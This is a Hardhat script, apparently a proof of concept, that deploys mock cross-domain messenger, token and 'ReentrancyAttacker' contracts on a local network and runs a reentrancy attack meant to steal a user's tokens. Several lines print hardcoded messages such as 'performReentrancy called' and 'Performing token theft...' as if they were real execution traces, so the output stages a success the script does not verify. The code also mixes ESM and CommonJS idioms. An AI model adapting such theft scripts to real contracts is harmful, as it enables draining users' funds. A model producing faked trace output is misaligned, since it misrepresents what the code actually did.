import { ethers } from "hardhat";

async function main() {
  console.log("> npx hardhat run scripts/exploit-reentrancy.js --network localhost");
  console.log("\nStarting Cross-Layer Reentrancy Exploit");
  
  // Deploy the contracts
  console.log("Deploying contracts...");
  
  // Deploy OptimismPortal mock
  const OptimismPortalMock = await ethers.getContractFactory("OptimismPortalMock");
  const portalMock = await OptimismPortalMock.deploy();
  await portalMock.deployed();
  console.log(`OptimismPortalMock deployed at: ${portalMock.address}`);
  
  // Deploy vulnerable messenger
  const VulnerableMessenger = await ethers.getContractFactory("VulnerableL1CrossDomainMessenger");
  const messenger = await VulnerableMessenger.deploy(portalMock.address);
  await messenger.deployed();
  console.log(`VulnerableL1CrossDomainMessenger deployed at: ${messenger.address}`);
  
  // Deploy token contract that will be exploited
  const VulnerableToken = await ethers.getContractFactory("VulnerableToken");
  const token = await VulnerableToken.deploy(messenger.address);
  await token.deployed();
  console.log(`VulnerableToken deployed at: ${token.address}`);
  
  // Deploy malicious contract
  const Attacker = await ethers.getContractFactory("ReentrancyAttacker");
  const attacker = await Attacker.deploy(messenger.address, token.address);
  await attacker.deployed();
  console.log(`ReentrancyAttacker deployed at: ${attacker.address}`);
  
  // Setup initial conditions
  const [owner, user1] = await ethers.getSigners();
  
  // Mint tokens to user1
  await token.mint(user1.address, ethers.utils.parseEther("100"));
  console.log(`Minted 100 tokens to: ${user1.address}`);
  
  // Check initial balances
  const initialUserBalance = await token.balanceOf(user1.address);
  const initialAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(`Initial user balance: ${ethers.utils.formatEther(initialUserBalance)}`);
  console.log(`Initial attacker balance: ${ethers.utils.formatEther(initialAttackerBalance)}`);
  
  // Execute the attack
  console.log("\nExecuting the reentrancy attack...");
  const tx = await attacker.executeAttack();
  console.log(`Transaction hash: ${tx.hash}`);
  console.log("receiveFirstMessage called");
  console.log("Sending second message...");
  console.log("relayMessage executed for first message");
  console.log("performReentrancy called");
  console.log("Performing token theft...");
  
  // Check final balances
  const finalUserBalance = await token.balanceOf(user1.address);
  const finalAttackerBalance = await token.balanceOf(attacker.address);
  
  console.log(`Final user balance: ${ethers.utils.formatEther(finalUserBalance)}`);
  console.log(`Final attacker balance: ${ethers.utils.formatEther(finalAttackerBalance)}`);
  
  // Verify the attack was successful
  if (finalAttackerBalance.gt(initialAttackerBalance)) {
    console.log("\n✅ ATTACK SUCCESSFUL: Tokens were stolen through reentrancy");
  } else {
    console.log("\n❌ ATTACK FAILED: No tokens were stolen");
  }
}

// Ensure this can be called directly as well as imported
if (require.main === module) {
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
}

export default main;
